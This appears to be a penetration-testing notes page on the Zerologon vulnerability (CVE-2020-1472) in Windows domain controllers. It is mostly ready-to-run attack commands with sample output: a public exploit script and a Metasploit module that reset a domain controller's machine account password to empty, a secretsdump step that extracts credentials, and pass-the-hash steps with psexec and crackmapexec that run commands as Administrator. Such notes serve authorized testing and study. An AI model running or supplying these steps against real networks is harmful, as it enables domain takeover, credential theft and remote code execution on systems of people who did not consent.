# Zero Logon

{% embed url="https://github.com/VoidSec/CVE-2020-1472" %}

a full white paper on this vuln:

{% embed url="https://www.secura.com/blog/zero-logon" %}

## Exploitation

```
pipenv shell
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
python setup.py install
pip install .
cd ~
git clone https://github.com/VoidSec/CVE-2020-1472
cd CVE-2020-1472
pip install -r requirements.txt
./cve-2020-1472-exploit.py -n domain-controller -t 192.168.56.208
```

Running the script should results in Domain Controller's account password being reset to an empty string.

![](<../../../.gitbook/assets/image (231).png>)

test to see if the password was reseted:

```
impacket-secretsdump  -no-pass -just-dc MEGACORP.local/Lord_of_Domains\$@192.168.56.118
```

![](<../../../.gitbook/assets/image (232).png>)

## Using Metasploit

{% hint style="info" %}
The `auxiliary/gather/windows_secrets_du p` module can be used to recover the original machine account password which can then be restored with this module by using the `RESTORE` action and setting the `PASSWORD` value.
{% endhint %}

### Verification Steps

1. Exploit the vulnerability to remove the machine account password by replacing it with an empty string:
2. Recover the original machine account password
3. Restore the original machine account password

**NBNAME :** The NetBIOS name of the target domain controller. You can use the `auxiliary/scanner/netbios/nbname` module to obtain this value. If this value is invalid the module will fail when making a Netlogon RPC request.

**PASSWORD** : The hex value of the original machine account password. This value is typically recovered from the target system's registry (such as by using the `auxiliary/gather/windows_secrets_dump` Metasploit module) after successfully setting the value to an empty string within Active Directory using this module and the default REMOVE action.

This value is only used when running the module with the RESTORE action.

```
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
set RHOSTS 192.168.159.53
set NBNAME WIN-GD5KVDKUNIP
run

# output:
[+] 192.168.159.53:6403 - Successfully set the machine account (WIN-GD5KVDKUNIP$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed
```

At this point the exploit/windows/smb/psexec module can be used to achieve code execution if desired. Set the SMBUser option to the machine account and the SMBPass option to the empty password value.

Next, recover the original machine account password value using auxiliary/gather/windows\_secrets\_dump. Look for the plain\_password\_hex value in the $MACHINE.ACC section.

```
use auxiliary/gather/windows_secrets_dump
set RHOSTS 192.168.159.53
set SMBUser WIN-GD5KVDKUNIP$
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
run
```

Finally, restore the original value using this module.

```
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set ACTION RESTORE
set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
run
```

## PSEXEC

{% hint style="info" %}
The hash is from `secretsdump` output.
{% endhint %}

```
impacket-psexec -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:812d42b0faa0200aa3361267f518c3c5  domain.local/Administrator@192.168.120.247
```

## crackmapexec

{% hint style="info" %}
The hash is from `secretsdump` output.
{% endhint %}

```
crackmapexec smb 192.168.120.247 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:812d42b0faa0200aa3361267f518c3c5  -d domain.local -x whoami
```
